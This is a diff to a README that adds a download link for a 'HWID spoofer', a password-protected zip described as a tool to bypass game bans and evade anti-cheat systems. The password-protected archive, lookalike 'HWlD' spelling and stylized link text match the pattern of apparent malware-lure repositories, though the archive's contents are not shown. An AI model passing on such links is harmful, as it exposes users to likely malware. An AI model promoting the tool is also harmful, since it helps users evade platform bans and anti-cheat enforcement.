@@ -1,7 +1,7 @@
 # HWID SPOOFY
 ## PASSWORD 2024
 
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Endalebob/HWlD-SPOOFER/releases/download/HWlD-SPOOFER/HWlD-SPOOFER.zip)***
 
 # An HWID spoofer is software that allows you to change or mask your computer’s unique hardware ID (HWID) to bypass bans and play games that have previously banned your account. Essentially, it’s a tool that enables gamers to evade anti-cheat measures put in place by game developers.
 # The HWID spoofer works by altering the unique identifier of your computer’s hardware components, making it appear as if you are using completely different hardware.
